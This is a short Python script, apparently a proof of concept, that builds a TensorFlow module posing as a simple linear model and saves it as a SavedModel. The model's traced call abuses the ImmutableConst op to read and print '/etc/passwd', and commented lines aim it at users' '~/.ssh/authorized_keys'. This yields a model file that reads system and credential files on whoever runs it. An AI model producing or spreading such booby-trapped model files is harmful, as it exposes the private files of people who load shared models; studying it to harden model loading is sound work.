import tensorflow as tf

class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
        # self.matching_path = tf.io.matching_files(pattern="/home/*")
        # _, tensor_str = self.mathing_path[0].__reduce__()
        # self.path = tensor_str[0]
        # self.memory_region_name = self.path.decode() + "/.ssh/authorized_keys"

    @tf.function
    def __call__(self, x):
        immutable_tensor = tf.raw_ops.ImmutableConst(
            dtype=tf.int8,
            shape=50,
            # memory_region_name=self.memory_region_name
            memory_region_name="/etc/passwd" # or /etc/passwd
            )
        ## read ascii of file contents, the shape must be smaller than file size.
        tf.print(immutable_tensor)
# 保存模型
        return self.a * x + self.b

# 实例化模型
model = SimpleLinearModel()

# 调用模型以收集追踪数据
result = model(tf.constant(5.0))

save_dir = 'ImmutableConst_passwd'
tf.saved_model.save(model, save_dir)
